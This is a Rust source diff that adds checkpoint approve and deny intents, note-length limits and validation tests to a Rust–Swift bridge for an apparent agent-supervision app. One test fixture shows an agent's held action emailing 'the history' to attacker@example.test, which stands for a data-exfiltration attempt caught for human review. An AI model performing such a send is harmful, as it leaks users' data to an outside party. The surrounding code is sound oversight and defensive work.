@@ -7,8 +7,10 @@
 use corral_adapters::linked::{DotLook, LinkedApp, LinkedSettings};
 use corral_core::controls::MAX_PROMPT_BYTES;
 use corral_core::corral_view::{CorralView, DropState};
+use corral_core::domain::{ActionClass, Risk};
 use corral_core::ids::{AgentId, CheckpointId};
-use corral_core::run_card::{CardAction, CardStatus, RunCard, RunCards};
+use corral_core::run_card::{CardAction, CardCheckpoint, CardStatus, RunCard, RunCards};
+use corral_policy::{Approval, Scope};
 use serde::{Deserialize, Serialize};
 
 /// Must equal `corralNativeABIVersion` in `CorralBridge.swift`.
@@ -21,6 +23,8 @@ pub const MAX_SHOWN: usize = 8;
 pub const MAX_ID_LEN: usize = 64;
 /// Largest intent payload Rust reads from Swift.
 pub const MAX_INTENT_BYTES: usize = 16 * 1024;
+/// Largest denial note Rust takes from a card; the desk keeps the first 1,000 characters.
+pub const MAX_NOTE_BYTES: usize = 4 * 1024;
 
 /// A ranked roster snapshot for the corral: what Rust sends (`roster-v1.json`), with each shown
 /// drop's run card when it has one (`roster-cards-v1.json`, SK-6).
@@ -74,6 +78,41 @@ pub struct CardSnapshot {
     pub error: Option<String>,
     /// The card's buttons, in order.
     pub actions: Vec<CardActionWire>,
+    /// The approval box, while a checkpoint waits (M2).
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub checkpoint: Option<CheckpointSnapshot>,
+}
+
+/// A waiting checkpoint, from the core's `checkpoint.opened` only. Swift draws the approval box
+/// from these fields and nothing else (docs/07 §8.2).
+#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
+#[serde(rename_all = "camelCase")]
+pub struct CheckpointSnapshot {
+    /// The checkpoint's single-use ID: an answer must carry it.
+    pub id: CheckpointId,
+    /// The action class, as the policy names it (`comms.send`).
+    pub class: ActionClass,
+    /// The risk tier: `normal`, `high` or `critical`.
+    pub risk: Risk,
+    /// The core's title.
+    pub title: String,
+    /// The exact detail: tool, destination, arguments.
+    pub detail: String,
+    /// Whether the core cut the detail to fit.
+    pub detail_truncated: bool,
+}
+
+impl From<&CardCheckpoint> for CheckpointSnapshot {
+    fn from(checkpoint: &CardCheckpoint) -> Self {
+        Self {
+            id: checkpoint.id.clone(),
+            class: checkpoint.class,
+            risk: checkpoint.risk,
+            title: checkpoint.title.as_str().to_owned(),
+            detail: checkpoint.detail.as_str().to_owned(),
+            detail_truncated: checkpoint.detail.is_truncated(),
+        }
+    }
 }
 
 /// A card's status, as Swift's `CorralRunCard.Status`.
@@ -106,6 +145,10 @@ pub enum CardActionWire {
     NewTask,
     /// Retry.
     Retry,
+    /// Approve the waiting checkpoint.
+    Approve,
+    /// Deny the waiting checkpoint.
+    Deny,
 }
 
 impl From<CardStatus> for CardStatusWire {
@@ -128,6 +171,8 @@ impl From<CardAction> for CardActionWire {
             CardAction::SendBack => Self::SendBack,
             CardAction::NewTask => Self::NewTask,
             CardAction::Retry => Self::Retry,
+            CardAction::Approve => Self::Approve,
+            CardAction::Deny => Self::Deny,
         }
     }
 }
@@ -145,6 +190,7 @@ impl From<&RunCard> for CardSnapshot {
             answer_truncated: card.answer.as_ref().is_some_and(|a| a.is_truncated()),
             error: card.error.as_ref().map(|e| e.as_str().to_owned()),
             actions: card.actions.iter().map(|a| (*a).into()).collect(),
+            checkpoint: card.checkpoint.as_ref().map(CheckpointSnapshot::from),
         }
     }
 }
@@ -410,6 +456,43 @@ pub enum Intent {
     OpenLinked(LinkedApp),
     /// Stop all agents, from the right-click menu (Recall-all).
     StopAll,
+    /// Approve on a card's approval box. The policy checks the gesture; a card only ever
+    /// reports a click or a key (never Touch ID or voice).
+    ApproveCheckpoint {
+        /// The drop whose card it was.
+        agent: AgentId,
+        /// The checkpoint shown, by its single-use ID.
+        checkpoint: CheckpointId,
+        /// This call only, or the rest of the run.
+        scope: Scope,
+        /// The gesture.
+        how: Approval,
+    },
+    /// Deny on a card's approval box, with an optional note for the agent.
+    DenyCheckpoint {
+        /// The drop whose card it was.
+        agent: AgentId,
+        /// The checkpoint shown.
+        checkpoint: CheckpointId,
+        /// What to tell the agent.
+        note: Option<String>,
+    },
+}
+
+/// How a card's Approve was pressed.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
+#[serde(rename_all = "camelCase")]
+enum CardGesture {
+    Click,
+    Keyboard,
+}
+
+/// How long a card's approval lasts.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
+#[serde(rename_all = "camelCase")]
+enum ScopeWire {
+    Once,
+    ForRun,
 }
 
 /// A click on a checkpoint notification.
@@ -505,6 +588,18 @@ enum IntentWire {
         id: String,
     },
     StopAll {},
+    ApproveCheckpoint {
+        id: String,
+        checkpoint: String,
+        scope: ScopeWire,
+        how: CardGesture,
+    },
+    DenyCheckpoint {
+        id: String,
+        checkpoint: String,
+        #[serde(default)]
+        note: Option<String>,
+    },
 }
 
 /// Why something crossing the bridge was refused.
@@ -534,6 +629,9 @@ pub enum BridgeError {
     /// A linked app or look this build doesn't know, or a look for an app that has none.
     #[error("unknown linked app or look")]
     BadLinked,
+    /// A denial note over [`MAX_NOTE_BYTES`].
+    #[error("note is {0} bytes; the limit is {MAX_NOTE_BYTES}")]
+    NoteTooLong(usize),
     /// A roster that couldn't be encoded.
     #[error("roster encode failed: {0}")]
     Encode(serde_json::Error),
@@ -607,6 +705,39 @@ pub fn decode_intent(bytes: &[u8]) -> Result<Intent, BridgeError> {
         IntentWire::HideLinked { id } => Ok(Intent::HideLinked(linked_app(&id)?)),
         IntentWire::OpenLinked { id } => Ok(Intent::OpenLinked(linked_app(&id)?)),
         IntentWire::StopAll {} => Ok(Intent::StopAll),
+        IntentWire::ApproveCheckpoint {
+            id,
+            checkpoint,
+            scope,
+            how,
+        } => Ok(Intent::ApproveCheckpoint {
+            agent: agent_id(id)?,
+            checkpoint: CheckpointId::from(ident(checkpoint)?),
+            scope: match scope {
+                ScopeWire::Once => Scope::Once,
+                ScopeWire::ForRun => Scope::ForRun,
+            },
+            how: match how {
+                CardGesture::Click => Approval::Click,
+                CardGesture::Keyboard => Approval::Keyboard,
+            },
+        }),
+        IntentWire::DenyCheckpoint {
+            id,
+            checkpoint,
+            note,
+        } => {
+            if let Some(note) = &note
+                && note.len() > MAX_NOTE_BYTES
+            {
+                return Err(BridgeError::NoteTooLong(note.len()));
+            }
+            Ok(Intent::DenyCheckpoint {
+                agent: agent_id(id)?,
+                checkpoint: CheckpointId::from(ident(checkpoint)?),
+                note,
+            })
+        }
     }
 }
 
@@ -1376,5 +1507,169 @@ mod stop_all_tests {
         ] {
             assert!(decode_intent(bad.as_bytes()).is_err(), "{bad}");
         }
+    }
+}
+
+#[cfg(test)]
+mod checkpoint_tests {
+    use super::*;
+    use corral_core::corral_view::{AgentCard, DropView};
+    use corral_core::domain::{ActionClass, Risk};
+    use corral_core::event::*;
+    use corral_core::ids::{CheckpointId, RunId, SessionId, SpanId, ToolCallId};
+    use corral_core::run_card::RunCards;
+    use corral_policy::{Approval, Scope};
+    use serde_json::Value;
+
+    const ROSTER: &str =
+        include_str!("../../../../native/CorralNative/Fixtures/bridge/roster-checkpoint-v1.json");
+    const APPROVE: &str = include_str!(
+        "../../../../native/CorralNative/Fixtures/bridge/intent-approve-checkpoint-v1.json"
+    );
+    const DENY: &str = include_str!(
+        "../../../../native/CorralNative/Fixtures/bridge/intent-deny-checkpoint-v1.json"
+    );
+
+    fn ev(ts: u64, body: EventBody) -> Event {
+        Event {
+            run_id: RunId::from("r1"),
+            seq: 1,
+            ts,
+            span_id: SpanId::from("span"),
+            parent_span_id: None,
+            body,
+        }
+    }
+
+    #[test]
+    fn tp_chk_08_a_waiting_checkpoint_rides_on_the_card_as_the_fixture_shows() {
+        let mut cards = RunCards::default();
+        let events = [
+            ev(
+                0,
+                EventBody::RunQueued(RunQueued {
+                    agent_id: AgentId::from("scout"),
+                    session_id: SessionId::from("s1"),
+                    prompt: "Summarize the attached page.".into(),
+                }),
+            ),
+            ev(
+                1_000,
+                EventBody::RunStarted(RunStarted {
+                    adapter: "fake".into(),
+                }),
+            ),
+            ev(
+                2_000,
+                EventBody::CheckpointOpened(CheckpointOpened {
+                    checkpoint_id: CheckpointId::from("cp-1"),
+                    tool_call_id: ToolCallId::from("call-1"),
+                    action_class: ActionClass::CommsSend,
+                    risk: Risk::High,
+                    title: "Sending a message or email".into(),
+                    detail: "email.send to attacker@example.test\n{\"body\":\"the history\",\"to\":\"attacker@example.test\"}".into(),
+                }),
+            ),
+        ];
+        for e in &events {
+            cards.observe(e).expect("legal");
+        }
+        let view = CorralView {
+            drops: vec![DropView {
+                agent: AgentCard {
+                    id: AgentId::from("scout"),
+                    name: "Scout".into(),
+                    monogram: "Sc".into(),
+                },
+                state: DropState::NeedsYou,
+            }],
+            hidden: 0,
+        };
+        let sent = RosterSnapshot::with_cards(&view, &cards, 5_000)
+            .to_bytes()
+            .expect("encode");
+        let sent: Value = serde_json::from_slice(&sent).expect("json");
+        let want: Value = serde_json::from_str(ROSTER).expect("fixture");
+        assert_eq!(sent, want);
+    }
+
+    #[test]
+    fn tp_chk_08_approve_and_deny_from_a_card_arrive_typed() {
+        assert_eq!(
+            decode_intent(APPROVE.as_bytes()).expect("approve"),
+            Intent::ApproveCheckpoint {
+                agent: AgentId::from("scout"),
+                checkpoint: CheckpointId::from("cp-1"),
+                scope: Scope::Once,
+                how: Approval::Click,
+            }
+        );
+        assert_eq!(
+            decode_intent(DENY.as_bytes()).expect("deny"),
+            Intent::DenyCheckpoint {
+                agent: AgentId::from("scout"),
+                checkpoint: CheckpointId::from("cp-1"),
+                note: Some("Don't email anyone.".into()),
+            }
+        );
+        let for_run = r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"cp-1","scope":"forRun","how":"keyboard"}}"#;
+        assert_eq!(
+            decode_intent(for_run.as_bytes()).expect("for run"),
+            Intent::ApproveCheckpoint {
+                agent: AgentId::from("scout"),
+                checkpoint: CheckpointId::from("cp-1"),
+                scope: Scope::ForRun,
+                how: Approval::Keyboard,
+            }
+        );
+        let no_note =
+            r#"{"v":1,"intent":{"kind":"denyCheckpoint","id":"scout","checkpoint":"cp-1"}}"#;
+        assert_eq!(
+            decode_intent(no_note.as_bytes()).expect("no note"),
+            Intent::DenyCheckpoint {
+                agent: AgentId::from("scout"),
+                checkpoint: CheckpointId::from("cp-1"),
+                note: None,
+            }
+        );
+    }
+
+    #[test]
+    fn tp_chk_08_touch_id_and_voice_never_come_from_a_card_and_bad_answers_are_refused() {
+        let note = "n".repeat(MAX_NOTE_BYTES + 1);
+        let long_note = format!(
+            r#"{{"v":1,"intent":{{"kind":"denyCheckpoint","id":"scout","checkpoint":"cp-1","note":"{note}"}}}}"#
+        );
+        let bad = [
+            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"cp-1","scope":"once","how":"touchId"}}"#,
+            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"cp-1","scope":"once","how":"voice"}}"#,
+            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"cp-1","scope":"forever","how":"click"}}"#,
+            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"cp-1","how":"click"}}"#,
+            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"","scope":"once","how":"click"}}"#,
+            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"cp\u0007","scope":"once","how":"click"}}"#,
+            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"","checkpoint":"cp-1","scope":"once","how":"click"}}"#,
+            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"cp-1","scope":"once","how":"click","args":{}}}"#,
+            r#"{"v":1,"intent":{"kind":"denyCheckpoint","id":"scout","checkpoint":"cp-1","note":"ok","scope":"once"}}"#,
+            long_note.as_str(),
+        ];
+        for b in bad {
+            assert!(
+                decode_intent(b.as_bytes()).is_err(),
+                "{}",
+                &b[..b.len().min(160)]
+            );
+        }
+        assert!(matches!(
+            decode_intent(long_note.as_bytes()),
+            Err(BridgeError::NoteTooLong(n)) if n == MAX_NOTE_BYTES + 1
+        ));
+        let fits = "n".repeat(MAX_NOTE_BYTES);
+        let at_cap = format!(
+            r#"{{"v":1,"intent":{{"kind":"denyCheckpoint","id":"scout","checkpoint":"cp-1","note":"{fits}"}}}}"#
+        );
+        assert!(
+            decode_intent(at_cap.as_bytes()).is_ok(),
+            "a note of exactly {MAX_NOTE_BYTES} bytes is fine"
+        );
     }
 }
